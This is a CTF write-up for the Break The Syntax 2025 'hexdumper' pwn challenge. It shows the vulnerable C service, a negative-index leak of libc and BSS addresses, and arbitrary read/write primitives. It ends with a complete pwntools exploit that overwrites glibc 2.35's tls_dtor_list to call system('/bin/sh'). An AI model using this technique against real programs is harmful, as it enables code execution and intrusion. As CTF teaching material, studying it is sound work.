---
title: "Break The Syntax 2025- hexdumper"
classes: wide
header:
  teaser: /assets/images/ctf-writeups/BTS2025/BTS2025-logo.png
ribbon: green
description: "This challenge provides a data management service that parses your data using the CSV format."
categories:
  - CTF Writeups
  - pwn
---

> Challenge description:
>
> CSV is the best way to store data. Wanna prove me wrong?

```c
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>


#define MAX_DUMPS 0x41
#define MAX_DUMP_SIZE 0x4141

// Georgia 16 by Richard Sabey 8.2003
char logo[] = \
"____    ____                         ________                                                      \n"
"`MM'    `MM'                         `MMMMMMMb.                                                    \n"
" MM      MM                           MM    `Mb                                                    \n"
" MM      MM   ____  ____   ___        MM     MM ___   ___ ___  __    __  __ ____     ____  ___  __ \n"
" MM      MM  6MMMMb `MM(   )P'        MM     MM `MM    MM `MM 6MMb  6MMb `M6MMMMb   6MMMMb `MM 6MM \n"
" MMMMMMMMMM 6M'  `Mb `MM` ,P          MM     MM  MM    MM  MM69 `MM69 `Mb MM'  `Mb 6M'  `Mb MM69   \n"
" MM      MM MM    MM  `MM,P           MM     MM  MM    MM  MM'   MM'   MM MM    MM MM    MM MM'    \n"
" MM      MM MMMMMMMM   `MM.           MM     MM  MM    MM  MM    MM    MM MM    MM MMMMMMMM MM     \n"
" MM      MM MM         d`MM.          MM     MM  MM    MM  MM    MM    MM MM    MM MM       MM     \n"
" MM      MM YM    d9  d' `MM.         MM    .M9  YM.   MM  MM    MM    MM MM.  ,M9 YM    d9 MM     \n"
"_MM_    _MM_ YMMMM9 _d_  _)MM_       _MMMMMMM9'   YMMM9MM__MM_  _MM_  _MM_MMYMMM9   YMMMM9 _MM_    \n"
"                                                                          MM                       \n"
"                                                                          MM                       \n"
"                                                                         _MM_                      \n";

size_t no_dumps = 0;
void *dumps[MAX_DUMPS];
size_t dump_sizes[MAX_DUMPS];

void make_me_a_ctf_challenge(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void menu(void) {
    puts("=========== DUMP MENU ===========");
    puts("1) Create a new dump");
    puts("2) Hexdump a dump");
    puts("3) Bite a byte");
    puts("4) Merge two dumps");
    puts("5) Resize dump");
    puts("6) Remove dump");
    puts("7) Dump all dumps");
    puts("8) Dump the dump menu");
    puts("0) Coredump");
}

void create_dump(void) {
    if (no_dumps >= MAX_DUMPS) {
        puts("\tExceeded maximum dump limit!");
        return;
    }

    size_t dump_size = 0;
    printf("\tDump size: ");
    scanf("%lu", &dump_size);
    if (dump_size > MAX_DUMP_SIZE) {
        printf("\tYour dump is too big! %lu > %lu\n",
               dump_size,
               (size_t)MAX_DUMP_SIZE);
        return;
    }

    void *dump = malloc(dump_size);
    if (dump == NULL) {
        puts("Something went very wrong, contact admins");
        exit(-1);
    }
    memset(dump, 0, dump_size);
    
    size_t free_dump_idx = 0;
    while (dumps[free_dump_idx] != NULL) ++free_dump_idx;
    dumps[free_dump_idx] = dump;
    dump_sizes[free_dump_idx] = dump_size;
    ++no_dumps;

    printf("\tSuccessfully created a dump at index %lu\n", free_dump_idx);
}

int ask_for_index(void) {
    int idx = -1;

    printf("\tDump index: ");
    scanf("%d", &idx);
    if (idx >= MAX_DUMPS) {
        puts("\tIndex is too big");
        return -1;
    }

    return idx;
}

void hexdump_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;

    char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    puts("");
    puts("          0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f");
    puts("     +--------------------------------------------------");
    for (size_t i = 0; i < len; ++i) {
        if (i % 16 == 0) {
            // Avoid newline for first line
            if (i != 0)
                putchar('\n');
            printf("%04lx |  ", i);
        }
        printf(" %02hhX", dump[i]);
    }
    putchar('\n');
}

void change_byte(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    unsigned char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    printf("\tOffset: ");
    size_t offset = 0;
    scanf("%lu", &offset);
    if (offset >= len) {
        printf("\tOffset is bigger than dump size. %lu >= %lu\n", offset, len);
        return;
    }

    printf("\tValue in decimal: ");
    unsigned char byte = 0;
    scanf("%hhu", &byte);
    dump[offset] = byte;
    printf("\tByte at offset %lu changed successfully\n", offset);
}

void merge_dumps(void) {
    int idx1 = ask_for_index();
    if (idx1 == -1)
        return;
    if (dumps[idx1] == NULL) {
        printf("\tDump with index %d doesn't exist\t", idx1);
        return;
    }
    
    int idx2 = ask_for_index();
    if (idx2 == -1)
        return;
    if (dumps[idx2] == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx2);
        return;
    }

    if (idx1 == idx2) {
        puts("\tCan't merge a dump with itself");
        return;
    }

    size_t len1 = dump_sizes[idx1];
    size_t len2 = dump_sizes[idx2];
    size_t new_len = len1 + len2;
    if (new_len > MAX_DUMP_SIZE) {
        printf("\tMerged size is too big! %lu > %lu\n",
               new_len,
               (size_t)MAX_DUMP_SIZE);
        return;
    }
    dumps[idx1] = realloc(dumps[idx1], len1+len2);
    dump_sizes[idx1] = new_len;

    // Code from: https://en.wikipedia.org/wiki/Duff%27s_device
    register unsigned char *to = dumps[idx1]+len1, *from = dumps[idx2];
    register int count = len2;
    {
        register int n = (count + 7) / 8;
        switch (count % 8) {
        case 0: do { *to++ = *from++;
        case 7:      *to++ = *from++;
        case 6:      *to++ = *from++;
        case 5:      *to++ = *from++;
        case 4:      *to++ = *from++;
        case 3:      *to++ = *from++;
        case 2:      *to++ = *from++;
        case 1:      *to++ = *from++;
                } while (--n > 0);
        }
    }

    free(dumps[idx2]);
    dumps[idx2] = NULL;
    dump_sizes[idx2] = 0;
    --no_dumps;
    
    puts("\tMerge successful");
}

void resize_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    if (dumps[idx] == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }

    printf("\tNew size: ");
    size_t new_size = 0;
    scanf("%lu", &new_size);
    if (new_size > MAX_DUMP_SIZE) {
        printf("\tNew size is too big! %lu > %lu\n",
               new_size,
               (size_t)MAX_DUMP_SIZE);
        return;
    }
    
    size_t old_size = dump_sizes[idx];
    if (old_size < new_size) {
        dumps[idx] = realloc(dumps[idx], new_size);

        // Zero out the new memory
        size_t no_new_bytes = new_size - old_size;
        memset(dumps[idx]+old_size, 0, no_new_bytes);
    }
    
    dump_sizes[idx] = new_size;
    puts("\tResize successful");
}

void remove_dump(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    if (dumps[idx] == NULL) {
        printf("\tNo dump at index %d\n", idx);
        return;
    }

    free(dumps[idx]);
    dumps[idx] = NULL;
    dump_sizes[idx] = 0;
    --no_dumps;
    printf("\tDump at index %d removed successfully\n", idx);
}

void list_dumps(void) {
    for (int i = 0; i < MAX_DUMPS; ++i) {
        void *dump = dumps[i];
        size_t len = dump_sizes[i];
        if (dump == NULL)
            continue;
        printf("%02d: size=%lu\n", i, len);
    }
}

int main() {
    make_me_a_ctf_challenge();
    printf("%s", logo);

    menu();
    for (;;) {
        putchar('\n');
        // Remember to always check the return value of stdio.h functions kids!
        // Stay safe!
        if (printf("==> ") < 0) {
            printf("error while printing !!\n");
            exit(-1);
        }
        int option = 0;
        scanf("%d", &option);
        switch (option) {
            case 1:
                create_dump();
                break;
            case 2:
                hexdump_dump();
                break;
            case 3:
                change_byte();
                break;
            case 4:
                merge_dumps();
                break;
            case 5:
                resize_dump();
                break;
            case 6:
                remove_dump();
                break;
            case 7:
                list_dumps();
                break;
            case 8:
            default:
                menu();
                break;
            case 0:
                exit(0);
        }
    }
}
```

This challenge provides a memory dump management service with a menu-driven interface. You can create up to 0x41 (65) dumps, each with a maximum size of 0x4141 (16705) bytes, stored in the dumps array. The available features include:
- Creating zero-initialized dumps
- Viewing dumps in a hex format (similar to hexdump)
- Modifying individual bytes
- Merging two dumps using Duff’s device (a loop-unrolling technique)
- Resizing dumps (with newly allocated memory zeroed)
- Removing dumps
- Listing all existing dumps

### Protections:
```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

The first bug we can spot is in this condition:
```c
// functions: hexdump_dump, change_byte, resize_dump, remove_dump.
int idx = ask_for_index();
if (idx == -1)
    return;
...
```

This check only filters out the index `-1`, but what about other negative values like `-80`? 
so lets see how can we use this to leak some memory addresses.

To demonstrate how this can leak memory, I chose the `change_byte()` function:
```c
void change_byte(void) {
    int idx = ask_for_index();
    if (idx == -1)
        return;
    unsigned char *dump = dumps[idx];
    if (dump == NULL) {
        printf("\tDump with index %d doesn't exist\n", idx);
        return;
    }
    size_t len = dump_sizes[idx];

    printf("\tOffset: ");
    size_t offset = 0;
    scanf("%lu", &offset);
    if (offset >= len) {
        printf("\tOffset is bigger than dump size. %lu >= %lu\n", offset, len);
        return;
    }

    printf("\tValue in decimal: ");
    unsigned char byte = 0;
    scanf("%hhu", &byte);
    dump[offset] = byte;
    printf("\tByte at offset %lu changed successfully\n", offset);
}
```

This function asks for a dump index and verifies that the corresponding dump exists. Then it asks for a byte offset and ensures it's within the size limit. If it's not, it prints both the offset and the dump size.

The trick here is to pass a negative index like `-80`, which accesses memory outside the bounds of the dumps array. Then, we pass an extremely large offset to trigger the print statement that leaks memory:

```txt
____    ____                         ________                                                      
`MM'    `MM'                         `MMMMMMMb.                                                    
 MM      MM                           MM    `Mb                                                    
 MM      MM   ____  ____   ___        MM     MM ___   ___ ___  __    __  __ ____     ____  ___  __ 
 MM      MM  6MMMMb `MM(   )P'        MM     MM `MM    MM `MM 6MMb  6MMb `M6MMMMb   6MMMMb `MM 6MM 
 MMMMMMMMMM 6M'  `Mb `MM` ,P          MM     MM  MM    MM  MM69 `MM69 `Mb MM'  `Mb 6M'  `Mb MM69   
 MM      MM MM    MM  `MM,P           MM     MM  MM    MM  MM'   MM'   MM MM    MM MM    MM MM'    
 MM      MM MMMMMMMM   `MM.           MM     MM  MM    MM  MM    MM    MM MM    MM MMMMMMMM MM     
 MM      MM MM         d`MM.          MM     MM  MM    MM  MM    MM    MM MM    MM MM       MM     
 MM      MM YM    d9  d' `MM.         MM    .M9  YM.   MM  MM    MM    MM MM.  ,M9 YM    d9 MM     
_MM_    _MM_ YMMMM9 _d_  _)MM_       _MMMMMMM9'   YMMM9MM__MM_  _MM_  _MM_MMYMMM9   YMMMM9 _MM_    
                                                                          MM                       
                                                                          MM                       
                                                                         _MM_                      
=========== DUMP MENU ===========
1) Create a new dump
2) Hexdump a dump
3) Bite a byte
4) Merge two dumps
5) Resize dump
6) Remove dump
7) Dump all dumps
8) Dump the dump menu
0) Coredump

==> 3
	Dump index: -80
	Offset: 9999999999999999999999999                                
	Offset is bigger than dump size. 18446744073709551615 >= 140737353750400

==>
```

Here, 140737353750400 is a leaked address. 
Checking its memory space reveals that it's within libc, specifically:
![libc leak](/assets/images/ctf-writeups/BTS2025/libc-leak.png)
![leak symbol](/assets/images/ctf-writeups/BTS2025/leak-symbol.png)

So we can see that this is a libc address pointing to the _IO_2_1_stdout_ object.
Now let's write that in our pwntools exploit:
```py
def leak_libc(p: process):
    send_option(p, "3")
    p.sendline("-80") 
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    libc = int(p.recvline()[:-1]) - 0x21b780 # offset of _IO_2_1_stdout_
    print("libc: ", hex(libc))
    return libc
```

Our next goal is to achieve arbitrary read/write.
To do that, we need to either leak the PIE base or find a negative index that lets us overwrite the dump buffer’s pointer. That would allow us to read from or write to any address.

I found that the dump buffer for index `-259` contains its own address (loop pointer).
We can leak it or overwrite its first byte to make it point to any PIE address we want.

Here’s the function that leaks that index:
```py
def leak_bss(p: process):
    send_option(p, "3")
    p.sendline("-259") #offset of
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    bss = int(p.recvline()[:-1])
    print("bss: ", hex(bss))
    return bss
```

Now we have two leaks: one for libc and one for the BSS section, and we also have the ability to perform arbitrary reads and writes to both libc and PIE addresses.

So let’s implement the arbitrary write function:
```py
def arbitrary_write(p: process, addr: int, data: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)

    idx -= 1
    for b in range(8):
        change_byte(p, idx, b, (data >> (b * 8)) & 0xff)
```
This function first edits the address pointed to by our BSS leak, then writes data to that address.

We can also use the same primitive for arbitrary read. 
We'll use the `hexdump_dump` feature to read and print memory at any given address:
```py
def arbitrary_read(p: process, addr: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)
    p.sendline("2")
    p.sendline("-192")
    p.recvuntil("0000 |   ")
    line = b''.join(reversed(p.recvline()[:-1].split(b' ')))
    res = int(line, 16)
    return res
```

Now that we have strong read/write primitives, we can build our exploit.
The glibc version is 2.35, so we can't overwrite `__malloc_hook` / `__realloc_hook` / `__free_hook` because they’ve been removed or protected.

Instead, we can use a another trick: overwrite the `tls_dtor_list`, which stores function pointers that get called when the program exits.
so it goes like this:

1. Leak the pointer_guard (relative to libc).
2. XOR it with the address of the function we want to run (e.g., `system()`).
3. Rotate the result right (ROL encryption) as required by glibc's protection.
4. Write the parameter for the function (like the address of `/bin/sh`) after the function pointer.
5. Overwrite the first entry in the `tls_dtor_list`.
6. Trigger an exit to run our payload.

Here's the pwntools code for that:
```py
    p_guard = arbitrary_read(p, libc - FS_BASE)
    print("p_guard: ", hex(p_guard))

    func = libc + SYSTEM
    func ^= p_guard
    func = rol(func, 0x11, word_size=64)

    arbitrary_write(p, bss + 0x20, func)
    arbitrary_write(p, bss + 0x28, libc + BINSH)
```

And here’s the complete exploit:
```py
from pwn import *

# libc offsets (for glibc 2.35)
__MALLOC_HOOK = 0x2214a0
ONE_GADGET =  0xebd43
__EXIT_FUNCS = 0x21a838
ENVIRON = 0x0000000000222200
MAIN_RET_ADDR = 0x20958
FS_BASE = 0x2890
__GI___call_tls_dtors = 0x2918
SYSTEM = 0x0000000000050d70
BINSH = 0x1d8678

def send_option(p: process, option: str):
    p.sendlineafter("==> ", option)

# edit a single byte at a specific index and offset
def change_byte(p: process, idx: int, offset: int, new_byte: int):
    p.sendline("3")
    p.sendline(str(idx))
    p.sendline(str(offset))
    p.sendline(str(new_byte))
    print("change_byte: ", idx, offset, hex(new_byte))

# leak libc address using _IO_2_1_stdout_
def leak_libc(p: process):
    send_option(p, "3")
    p.sendline("-80")
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    libc = int(p.recvline()[:-1]) - 0x21b780
    print("libc: ", hex(libc))
    return libc

# leak BSS pointer (loop pointer)
def leak_bss(p: process):
    send_option(p, "3")
    p.sendline("-259")
    p.sendline(str(0xffff_ffff_ffff_ffff))
    p.recvuntil(">= ")
    bss = int(p.recvline()[:-1])
    print("bss: ", hex(bss))
    return bss

# perform arbitrary write using double chunk trick
def arbitrary_write(p: process, addr: int, data: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)

    idx -= 1
    for b in range(8):
        change_byte(p, idx, b, (data >> (b * 8)) & 0xff)

# arbitrary read by setting pointer and dumping
def arbitrary_read(p: process, addr: int):
    idx = -191
    for b in range(8):
        change_byte(p, idx, b, (addr >> (b * 8)) & 0xff)
    p.sendline("2")
    p.sendline("-192")
    p.recvuntil("0000 |   ")
    line = b''.join(reversed(p.recvline()[:-1].split(b' ')))
    res = int(line, 16)
    return res

# leak stack using environ
def leak_stack(p: process, libc: int):
    stack = arbitrary_read(p, libc + ENVIRON) - 0x20a78
    print("stack: ", hex(stack))
    return stack

def generate_dtor_struct(p: process, param: int, addr: int):
    return p64(addr) + p64(param)

def main():
    p = process("/tmp/h")

    libc = leak_libc(p)
    bss = leak_bss(p)

    # setup for arb read/write
    idx = -191
    change_byte(p, idx, 0, (bss & 0xff) - 8)
    arbitrary_write(p, bss + (0x44 * 8) - 8, 8)

    stack = leak_stack(p, libc)
    p_guard = arbitrary_read(p, libc - FS_BASE)
    print("p_guard: ", hex(p_guard))

    # craft encrypted function pointer
    func = libc + SYSTEM
    func ^= p_guard
    func = rol(func, 0x11, word_size=64)

    # write TLS dtors payload
    arbitrary_write(p, bss + 0x20, func)
    arbitrary_write(p, bss + 0x28, libc + BINSH)
    for i in range(1,3):
        arbitrary_write(p, bss + 0x28 + (i * 8), 0)

    # overwrite TLS destructor list
    arbitrary_write(p, libc - __GI___call_tls_dtors, bss + 0x20)

    # trigger exit
    p.sendline("0")
    p.interactive()

if __name__ == "__main__":
    main()
```
